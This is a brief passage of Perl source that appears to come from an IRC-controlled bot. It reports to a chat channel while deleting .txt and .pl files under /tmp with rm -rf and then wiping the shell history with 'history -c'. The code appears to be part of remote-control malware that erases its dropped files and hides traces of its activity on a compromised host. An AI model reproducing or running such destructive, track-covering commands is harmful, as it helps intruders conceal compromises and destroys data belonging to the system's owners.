 &display( $dsp, "PRIVMSG $channel :0,1Cleanning /tmp! Deleting 05.txt0 and 05.pl");
    system 'cd /tmp;rm -rf *txt';
    system 'cd /tmp;rm -rf *txt*';
    system 'cd /tmp;rm -rf *pl';
    system 'cd /tmp;rm -rf *pl*';
    system 'history -c';
 &display( $dsp, "PRIVMSG $channel :4,1 Ok, /tmp is Cleaned");
			}
